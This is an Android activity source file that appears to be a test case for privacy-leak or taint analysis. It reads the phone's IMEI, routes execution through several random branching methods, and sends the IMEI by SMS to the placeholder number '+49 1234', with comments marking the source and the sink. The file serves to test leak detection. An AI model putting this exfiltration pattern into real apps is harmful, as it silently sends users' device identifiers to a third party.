package edu.privacyleak.manymethodcalls;

import android.app.Activity;
import android.os.PersistableBundle;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

import java.util.logging.Logger;

public class MainActivity extends AppCompatActivity {

    String imei = "";
    SmsManager sms;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) {
        super.onCreate(savedInstanceState, persistentState);
    }

    @Override
    public void onOptionsMenuClosed(Menu menu) {
        doneFirst();
        super.onOptionsMenuClosed(menu);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        TelephonyManager mgr = (TelephonyManager) getSystemService(Activity.TELEPHONY_SERVICE);
        imei = mgr.getDeviceId();  //source
        return super.onCreateOptionsMenu(menu);
    }

    private void doneFirst(){
        sms = SmsManager.getDefault();
        doNext();
    }

    private void doNext() {
        int random = (int) (Math.random() * 10);
        if(random >= 5){
            doBigger();
        }else{
            doSmaller();
        }
    }

    private void doBigger() {
        goToSwitcher();
    }

    private void doSmaller() {
        goToSwitcher();
    }

    private void goToSwitcher() {
        int random = (int) (Math.random() * 3);
        switch (random){
            case 0:
            case 1:
            case 2:
                leak();
                break;
            case 3:
            default:
                nothing();
        }
    }

    private void leak() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
    }

    private void nothing() {
        Logger.getLogger("MainActivity");
    }
}
